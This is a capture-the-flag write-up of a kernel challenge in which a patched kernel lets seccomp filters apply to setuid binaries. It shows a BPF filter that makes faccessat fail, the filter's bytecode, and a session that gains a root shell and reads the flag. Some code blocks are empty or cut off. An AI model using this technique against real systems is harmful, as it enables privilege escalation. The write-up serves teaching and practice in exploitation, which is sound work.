# Intro

This writeup is pretty late, given that [UIUCTC 21](https://ctftime.org/event/1372) ended a good few days ago, but now its here.

This was a first for me, and for my team-mate [X3eRo0](https://twitter.com/X3eRo0/); a kernel challenge in a live CTF environment. Although we both finished the kernel section of [pwn.college](https://pwn.college/) this was a little different, as you'll see.

## Pre-requisites

This writeup assumes that the reader knows what `seccomp` is, and what it does along with how it does it. If you don't, reading through the [man page](https://man7.org/linux/man-pages/man2/seccomp.2.html) a little will help with that understanding.

## What

The challenge gives us links to a `handout.tar.gz` and `starter.c`. On extracting the handout, we are greeted with a `challenge` folder, and inside that folder are the following files:

` Dockerfile  kernel/  nsjail.cfg  src/ `

We are given a `Dockerfile`, `kernel/` directory, an nsjail configuration file and a `src/` folder. Building this in docker takes a long time, and quite a lot of disk space so if you want to you can skip that process completely and just use:

```sh
stty raw -echo; nc insecure-seccomp.chal.uiuc.tf 1337; stty -raw echo
```

To connect to the remote service, IF its still up, that is. Anyway, looking in the dockerfile we can get some details about our challenge before even reading the source, in particular:

```
COPY kernel/kconfig /kernel/linux-5.12.14/.config
COPY kernel/patch /tmp/kernel.patch
COPY kernel/CVE-2021-33909.patch /tmp/CVE-2021-33909.patch
RUN patch -p1 -d /kernel/linux-5.12.14 < /tmp/CVE-2021-33909.patch
RUN patch -p1 -d /kernel/linux-5.12.14 < /tmp/kernel.patch
```

Here we can see the some files, such as the `kconfig` which contains flags and build instructions for our kernel, and 2 other files, `patch` and `CVE-2021-33909.patch`. The latter provides a fix for a recent CVE, and is not relevant on our end, however the former is a bit more interesting:

```

```

It looks like before our kernel is compiled, the `patch` command is used comment some lines out, but what is the significance of these lines? Well, googling `test_no_new_privs()` the first result is [this](http://bricktou.cn/include/linux/schedtask_no_new_privs_en.html), here we can see a function prototype and a description for what purpose this has:

```c
static bool task_no_new_privs(struct task_struct *p)
```

The description states: `Determine whether a bit is set`. Of course this makes sense given the function returns a Boolean. Now lets look at the implementation. The latter also links to a source snipped, however our kernel version is different, so we can look [here](https://elixir.bootlin.com/linux/v5.12.14/source/include/linux/sched.h#L1646) instead:

```c
/* Per-process atomic flags. */
#define PFA_NO_NEW_PRIVS		0	/* May not gain new privileges. */
#define PFA_SPREAD_PAGE			1	/* Spread page cache over cpuset */
#define PFA_SPREAD_SLAB			2	/* Spread some slab caches over cpuset */
#define PFA_SPEC_SSB_DISABLE		3	/* Speculative Store Bypass disabled */
#define PFA_SPEC_SSB_FORCE_DISABLE	4	/* Speculative Store Bypass force disabled*/
#define PFA_SPEC_IB_DISABLE		5	/* Indirect branch speculation restricted */
#define PFA_SPEC_IB_FORCE_DISABLE	6	/* Indirect branch speculation permanently restricted */
#define PFA_SPEC_SSB_NOEXEC		7	/* Speculative Store Bypass clear on execve() */

#define TASK_PFA_TEST(name, func)					\
	static inline bool task_##func(struct task_struct *p)		\
	{ return test_bit(PFA_##name, &p->atomic_flags); }

#define TASK_PFA_SET(name, func)					\
	static inline void task_set_##func(struct task_struct *p)	\
	{ set_bit(PFA_##name, &p->atomic_flags); }

#define TASK_PFA_CLEAR(name, func)					\
	static inline void task_clear_##func(struct task_struct *p)	\
	{ clear_bit(PFA_##name, &p->atomic_flags); }

TASK_PFA_TEST(NO_NEW_PRIVS, no_new_privs)
```

Specifically, the definition is on the last line. Doesn't much look like a function definition, does it? But it gets a bit clearer when you look at the macro being used:

```c
#define TASK_PFA_TEST(name, func)                    \
    static inline bool task_##func(struct task_struct *p)        \
    { return test_bit(PFA_##name, &p->atomic_flags); }
```

It takes a `name` and a `func`, then based on that will use even more macros to stitch together a function name, we pass in `NO_NEW_PRIVS` as our `name`, and `no_new_privs` as our `func`, and based on that it will give us a function name of `task_no_new_privs`.

If we look inside the function, we can see that it is, in fact testing a bit. In this case `PFA_NO_NEW_PRIVS`, or '1'. So what is the purpose of this bit, exactly?

Again, by googling we can find [this](https://unix.stackexchange.com/questions/562260/why-we-need-to-set-no-new-privs-while-before-calling-seccomp-mode-filter) answer on stack overflow. The gist is:

"The no_new_privs bit is a property of the process which, if set, tells the kernel to not employ privileges escalation mechanisms like SUID bit (so, invoking things like sudo(8) will not work at all), so it is safe to allow the unprivileged process with this bit set to use seccomp filters: this process will not have any possibility to escalate privileges even temporarily, thus, will not be able to "hijack" these privileges."

`seccomp` has a lot of features, one of which is the ability to skip a syscall, and set an arbitrary `ERRNO`/return value from said syscall. Look at this code, taken from the answer:

```c
// Make the `openat(2)` syscall always "succeed".
seccomp_rule_add(seccomp, SCMP_ACT_ERRNO(0), SCMP_SYS(openat), 0);
```

Once this rule is applied, the `openat` syscall will return '0' regardless of whether the file in question actually exists. This means that checks in the program that expect a '-1' on failure will be invalidated and depending on the depth of error checking may just assume the file exists, when it in fact does not.

Now with that knowledge we can look back on the patched code from our kernel:

```c
-       if (!task_no_new_privs(current) &&
-                       !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
-               return ERR_PTR(-EACCES);
```

So, if the `no_new_privs` bit is NOT set (meaning the process to which the seccomp rule is being applied IS setuid/running under sudo) AND the current process was not started by root, `seccomp` will fail before loading the filter/rule, meaning that no meddling with the return value is possible where we may have something to gain from it.

But now remember the patch:

```c
+       // if (!task_no_new_privs(current) &&
+       //              !ns_capable_noaudit(current_user_ns(), CAP_SYS_ADMIN))
+       //      return ERR_PTR(-EACCES);
```

This has been undone. Any process, regardless of setuid status will have the rule applied. This will be incredibly important moving forward, so don't forget :).

## The challenge

Now that we have covered all that, we can get to the challenge sources. Lets first take a look at `jail.c`:

                perror("setgid");
                return 1;
        }

        if (setgroups(0, NULL)) {
                perror("setgroups");
                return 1;

```

This isn't particularly special, just know that this is the source for the shell you receive when you interact with the remote service.
Now lets look at `seccomp_loader.c`, an interesting name for sure given what we know about the kernel:

```c

                if (scanf(" %hx %hhx %hhx %x",
                          &insns[i].code,
                          &insns[i].jt,

        prog.len = num_insns;
        prog.filter = insns;

        if (seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog))
                perror_exit("seccomp");

        execv(argv[1], &argv[1]);
        perror_exit("execv");

bad_format:
        fprintf(stderr, "Bad format\n");
        return 1;
}
```

Whats this then? One of the ways you can apply `seccomp` rules to a program is via [eBPF](https://ebpf.io/). eBPF is a relatively new addition to the Linux kernel, and for our purposes provides a programmable way to filter syscalls. Its alot deeper than that; it has its own JIT compiler in the kernel, and is also used across many projects to provide monitoring and filtering capabilities, but we'll be focusing specifically on syscall filtering.

Anyway, `seccomp` has `SECCOMP_SET_MODE_FILTER` which we can use to apply eBPF rules the same way we would apply regular rules. Since eBPF is JIT compiled in the kernel, it has its own bytecode architecture; each instruction of this arch comes packed into a struct:

```c
struct sock_filter {    /* Filter block */
        __u16   code;   /* Actual filter code */
        __u8    jt;     /* Jump true */
        __u8    jf;     /* Jump false */
        __u32   k;      /* Generic multiuse field */
};
```

You only have to look deep into the abyss if you want to, but you don't particularly need to if you don't want to, I know I didn't - but if you do, take a look at:

  - https://www.collabora.com/news-and-blog/blog/2019/04/15/an-ebpf-overview-part-2-machine-and-bytecode/
  - https://www.youtube.com/watch?v=2lbtr85Yrs4
  - And of course: https://ebpf.io/

All you need to know is this is how each eBPF instruction is formatted. There is another strange type here, `sock_fprog`:

```c
struct sock_fprog {	/* Required for SO_ATTACH_FILTER. */
	unsigned short		len;	/* Number of filter blocks */
	struct sock_filter __user *filter;
};
```

This stores a list/array of `sock_filter`s, and as the name would suggest this structure is intended to store an entire eBPF program, with many instructions.

Next some pretty nice stuff happens:

```c
if (scanf("%hu", &num_insns) != 1)
        goto bad_format;

insns = calloc(num_insns, sizeof(*insns));
if (!insns)
        perror_exit("calloc");

for (int i = 0; i < num_insns; i++) {
        if (scanf(" %hx %hhx %hhx %x",
                  &insns[i].code,
                  &insns[i].jt,
                  &insns[i].jf,
                  &insns[i].k) != 4)
                goto bad_format;
}

prog.len = num_insns;
prog.filter = insns;

if (seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog))
        perror_exit("seccomp");

execv(argv[1], &argv[1]);
perror_exit("execv");
```

Via `scanf()`, were given control over the entire `sock_fprog` and each `sock_filter`, we can also apply as many instructions as we want, as we control the `len` field of the struct. Our filter is then applied, and then we `execv` with our `argv[1]`. What this means is:

  - We control the entire eBPF program.
  - As seccomp filters also apply to children, we may apply this filter to any program we want by adding the path to `argv[1]`
  - Because of the kernel patch, we can apply this even to setuid binaries.

You would assume, correctly, that eBPF has all the capabilities of a regular seccomp rule/set of rules.

Now, are there any setuid programs here?

```sh
-r-sr-xr-x    1 0        0            29008 Jul 30 22:20 exploit_me
```

Yes, yes there is. Shall we take a look next at `exploit_me.c`?

```c
// SPDX-License-Identifier: Apache-2.0                                                                                               
/*

 */

#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
        if (!faccessat(AT_FDCWD, "/flag", R_OK, AT_EACCESS)) {
                fprintf(stderr, "You can't be root to execute this! ... or can you?\n");
                return 1;
        }

        setuid(geteuid());

        execl("/bin/sh", "sh", NULL);
        perror("execl");
        return 1;
}
```

Pretty simple. If `faccessat` would not find the file `/flag` (or, if it where to just return a non-zero value) we will get a root shell, and from there we will be able to `cat /flag`. However how would this work? `faccessat` *should* always find `/flag`, because it exists? Right?

# Exploitation

This is a little different from what I'm used to, its not really binary exploitation, but more of a logic bug. Although this isn't necessarily a bad thing; much less can go wrong when exploiting bugs like this, in fact almost nothing.

Anyway, exploitation is pretty straightforward:

  1. Make an eBPF filter to 'hook' the `faccessat` syscall, and make it return a nonzero value.
  2.  Run `exploit_me` under `seccomp_loader` with this filter
  3.  Get root, cat flag.

When downloading the program, we are given a `starter.c`:

```c
// SPDX-License-Identifier: MIT
/*
 * Copyright 2021 Google LLC.
 */

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <stdio.h>
#include <sys/syscall.h>

int main(int argc, char *argv[])
{
	struct sock_filter insns[] = {
		// Your filter here
		BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
	};
	unsigned short num_insns = sizeof(insns) / sizeof(insns[0]);

	printf("%hu\n", num_insns);
	for (unsigned short i = 0; i < num_insns; i++) {
		printf("%04hx %02hhx %02hhx %08x\n",
		       insns[i].code,
		       insns[i].jt,
		       insns[i].jf,
		       insns[i].k);
	}

	return 0;
}
```

Basically we can just slot our filter into the `insns` array, and we will be given the bytecode for all the instructions in the filter that we can just slot into `seccomp-loader`, EZ.

X3eRo0 and I (mainly X3eRo0) used [seccomp-tools](https://github.com/david942j/seccomp-tools) to construct our filter. It has many features, one of which allows you to program a filter using a custom language. Heres what our solution looked like:

```
A = sys_number                                                                                                                       
A == faccessat ? lol : done
lol:
return ERRNO(5)
done:
return ALLOW
kill:
return KILL
```

This, again is pretty simple, at least more simple than using the BPF macros (lol). All it does is store the syscall number, check if it == faccessat, and if it does set the return value/errno to 5, effectively causing the syscall to fail. If we do any other syscall it simply allows it to continue. the `kill` bit is not used.

You can dump this into eBPF bytecode in `seccomp-tools`:

```
root@nomu:~/D/u/insecure_seccomp
❯❯ seccomp-tools asm ebpf.asm                                                                                                        
" \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x01\r\x01\x00\x00\x06\x00\x00\x00\x05\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x00\x00"
```

And X3eRo0 also modified the `starter.c` so that it works with a char* rather than a list of instructions:

```c
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <stdio.h>
#include <sys/syscall.h>

int main(int argc, char *argv[])
{
        // just paste your filter here
        char *filters = " \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x01\r\x01\x00\x00\x06\x00\x00\x00\x05\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x00\x00";

        unsigned short num_insns = 5; // just count the number of instructions, we dont care.

        printf("%hu\n", num_insns);
        for (unsigned short i = 0; i < num_insns; i++) {
                printf("%04hx %02hhx %02hhx %08x\n",
                       ((struct sock_filter*)filters)[i].code,
                       ((struct sock_filter*)filters)[i].jt,
                       ((struct sock_filter*)filters)[i].jf,
                       ((struct sock_filter*)filters)[i].k);
        }

        return 0;
}

```

Now when you compile+run `starter`, you should get your output as eBPF bytecode:

5                                                                                                                                    
0020 00 00 00000000
0015 00 01 0000010d
0006 00 00 00050005
0006 00 00 7fff0000
0006 00 00 00000000
```

Now when you send this on the remote service, while running `exploit_me`:

```
/usr/local/bin $ ./seccomp_loader ./exploit_me
5
0020 00 00 00000000
0015 00 01 0000010d
0006 00 00 00050005
0006 00 00 7fff0000
0006 00 00 00000000
/usr/local/bin # cat /flag
uiuctf{seccomp_plus_new_privs_equals_inseccomp_e84609bf}
/usr/local/bin #

```

You will get a root shell, and then flag.

# Closing thoughts

Kernel is very complicated. Bold statements only here xD.

This was a pretty cool challenge, X3eRo0 and I both learned alot about eBPF. I hope you did too.

Another lesson: Always `ls -la` to check whether a binary is setuid, and don't just assume that every shell will have fancy syntax highlighting for you :P (this confused me for a while, I couldnt spot the setuid binary, lol).
